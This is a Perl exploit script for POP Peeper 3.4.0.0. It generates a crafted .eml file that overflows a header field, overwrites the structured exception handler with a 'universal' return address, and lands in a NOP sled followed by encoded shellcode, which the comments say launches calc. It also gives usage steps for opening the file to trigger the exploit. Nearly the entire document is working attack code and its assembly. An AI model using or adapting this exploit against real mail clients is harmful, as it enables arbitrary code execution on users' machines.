 # POP Peeper 3.4.0.0 .eml file Universal SEH Overwrite Exploit
# Exploit By Stack
# Mountassif Moad
# how to use file  Open message or Ctrl + O
# Select The .eml file ......>>
# BooM Calc Executed :d
# Thnx Simo- SOft - Jadi - Str0ke
# usage perl xpl.pl >>stack.eml
my $mp=
"\x4d\x41\x49\x4c\x20\x46\x52\x4f\x4d\x3a\x20\x53\x74\x61\x63\x6b".# Start first Header
"\x20\x0d\x52\x43\x50\x54\x20\x54\x4f\x3a\x20\x20\x53\x74\x61".
"\x63\x6b\x0d\x44\x41\x54\x41\x0d\x46\x52\x4f\x4d\x3a\x20". # End first Header
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41". # Start Junk
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41". # End Junk
"\xeb\x06\x90\x90". # Next_Seh
"\x4c\x51\x01\x10". # SEh ( Universal )
"\x90\x90\x90\x90\x90\x90\x90\x90". # Start Nop
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90". # End Nop
"\xeb\x03\x59\xeb". # Start Scode
"\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56".
"\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36\x48\x48\x30\x42".
"\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32\x41\x44".
"\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41\x56\x58\x34\x5a".
"\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44\x42\x50\x42\x50".
"\x42\x30\x4b\x48\x45\x34\x4e\x43\x4b\x38\x4e\x47\x45\x30\x4a\x57".
"\x41\x30\x4f\x4e\x4b\x48\x4f\x34\x4a\x51\x4b\x48\x4f\x55\x42\x52".
"\x41\x50\x4b\x4e\x49\x34\x4b\x48\x46\x53\x4b\x48\x41\x50\x50\x4e".
"\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c\x46\x37\x47\x50".
"\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e\x46\x4f\x4b\x53".
"\x46\x55\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x38\x4f\x45\x46\x32".
"\x41\x30\x4b\x4e\x48\x56\x4b\x38\x4e\x50\x4b\x54\x4b\x48\x4f\x45".
"\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x58\x41\x50\x4b\x4e".
"\x49\x48\x4e\x45\x46\x42\x46\x30\x43\x4c\x41\x43\x42\x4c\x46\x36".
"\x4b\x58\x42\x34\x42\x33\x45\x48\x42\x4c\x4a\x57\x4e\x30\x4b\x48".
"\x42\x44\x4e\x30\x4b\x48\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x4a\x46".
"\x4a\x50\x4b\x4e\x49\x30\x4b\x58\x42\x38\x42\x4b\x42\x50\x42\x50".
"\x42\x30\x4b\x48\x4a\x36\x4e\x53\x4f\x45\x41\x33\x48\x4f\x42\x36".
"\x48\x45\x49\x48\x4a\x4f\x43\x38\x42\x4c\x4b\x47\x42\x55\x4a\x46".
"\x42\x4f\x4c\x38\x46\x50\x4f\x55\x4a\x36\x4a\x39\x50\x4f\x4c\x38".
"\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x36\x4e\x56\x43\x36".
"\x50\x32\x45\x36\x4a\x57\x45\x56\x42\x30\x5a". # End Scode
"\x0d\x54\x4f\x3a". # Start Second Header
"\x20\x53\x74\x61\x63\x6b\x20\x3a\x64\x20\x0d\x0d\x0d".
"\x0d"; # End Second Header
print $mp;
